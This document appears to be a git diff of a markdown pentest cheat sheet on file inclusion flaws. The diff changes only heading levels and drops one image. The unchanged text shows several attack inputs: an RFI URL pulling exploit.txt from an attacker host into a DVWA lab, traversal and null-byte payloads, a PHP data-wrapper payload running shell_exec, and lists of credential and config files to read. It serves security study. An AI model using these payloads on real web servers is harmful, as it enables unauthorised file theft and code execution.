@@ -19,7 +19,7 @@ hide_title: true
 excerpt: ""
 ---
 
-# LFI Basics
+## LFI Basics
 
 Local File Inclusion (LFI) vulnerabilities allow an attacker to use specifically crafted requests to read local files on the web server (including log files and configuration files containing password hashes or even clear text passwords). LFI vulnerabilities can also lead to remote code execution on the target web server and a denial of service (DoS). Most, if not all, web application frameworks support file inclusion and file inclusion vulnerabilities are often the result of poor user input validation.
 
@@ -37,7 +37,7 @@ It calling **index.php** through php function so we can try if it can able to ca
 
 And if we got **/etc/passwd** output back , target is vulnerable to **LFI**
 
-# RFI Basic
+## RFI Basic
 
 - RFI stands for Remote File Inclusion. Where LFI includes files on stored on the local system, RFI includes files from remote locations, on a web server for example. Let’s see if we can include a remote file too on the DVWA application by entering an external URL in the page parameter. For this demonstration we have loaded a text file named exploit.txt on a remote server with the IP address 172.16.1.4 (because the text file is on a remote server we don’t have to work with a current working directory with the ../ value but we can reference it directly):
 - Remote File Inclusions (RFI) are very similar to LFI but affect files on remote servers instead of files on the local web server. Remote files can include malicious code that executes on the server in the context of the user running the web server or on any client devices that visit a compromised webpage.
@@ -47,7 +47,6 @@ We can exploit rfi with adding our own shell at the end of vulnerable endpoint ,
 `http://10.11.1.250/dvwa/vulnerabilities/fi/?page=http://172.16.1.4/exploit.txt`
 
 ### Required Settings to work RFI
-![[image 1.avif]]
 
 The first warning indicates that URL file-access is disabled in the server configuration. Without URL file access enabled we’re unable to include files from remote locations, such as our attack box.**To successfully include remote files in PHP there are a few parameters in the "php.ini" file that must be enabled:**
 
@@ -59,7 +58,7 @@ This settings can be found on **phpinfo.php** page so we can check if following 
 
 `http://10.11.1.250/dvwa/phpinfo.php`
 
-# Interesting Files Linux
+## Interesting Files Linux
 
 ```
 /etc/passwd
@@ -73,7 +72,7 @@ This settings can be found on **phpinfo.php** page so we can check if following 
 /etc/hostname
 ```
 
-## Log Files
+### Log Files
 
 ```
  Apache access log: /var/log/apache/access.log
@@ -95,7 +94,7 @@ This settings can be found on **phpinfo.php** page so we can check if following 
  Authentication logs: /var/log/secure or /var/log/auth.log
 ```
 
-## CMS configuration files
+### CMS configuration files
 
 ```
 WordPress: /var/www/html/wp-config.php
@@ -113,7 +112,7 @@ PHPNuke: /var/www/config.php
 PHPbb: /var/www/config.php
 ```
 
-# Interesting Files Windows
+## Interesting Files Windows
 
 `To verify LFI on Windows systems a very common file we can attempt to include is the hosts file in the following directory:`
 
@@ -167,7 +166,7 @@ C:/users/administrator/ntuser.ini
 C:/windows/windowsupdate.log
 ```
 
-## XAMPP
+### XAMPP
 
 ```
  C:/xampp/apache/conf/httpd.conf
@@ -191,7 +190,7 @@ C:/windows/windowsupdate.log
  C:/xampp/apache/conf/httpd.conf
 ```
 
-# Null Byte Injection
+## Null Byte Injection
 
 - **Useful in case where php adding extension at the end of file name**
 - In some specific cases you need to add a null byte terminator to the LFI/RFI vulnerable parameter. **A Null byte is a byte with the value zero (%00 or 0x00 in hex) and represents a string termination point or delimiter character.** Adding a null byte to a payload can alternate intended program logic as **it immediately stops the string from further processing any bytes after the null byte. This means that any bytes after the null byte delimiter will be ignored.**
@@ -223,11 +222,11 @@ http://example.com/page=../../../../../../etc/passwd?
 /etc/passwd%00jpg     
 ```
 
-# PHP Wrappers
+## PHP Wrappers
 
 PHP provides several protocol wrappers that we can use to exploit directory traversal and local file inclusion. These filters give us additional flexibility when attempting to inject PHP code via LFI vulnerabilities.
 
-## Identifying Vulnerability
+### Identifying Vulnerability
 
 ```
 http://192.168.112.132/menu.php?file=data:text/plain,helloworld
@@ -235,13 +234,13 @@ http://192.168.112.132/menu.php?file=data:text/plain,helloworld
 
 IF this payload return **helloworld** then we can use php wrappers to execute php commands too
 
-## Executing commands
+### Executing commands
 
 ```
 http://192.168.112.132/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
 ```
 
-## php filter
+### PHP filter
 
 Another PHP wrapper, `php://filter` in this example the output is encoded using base64, so you’ll need to decode the output.
 
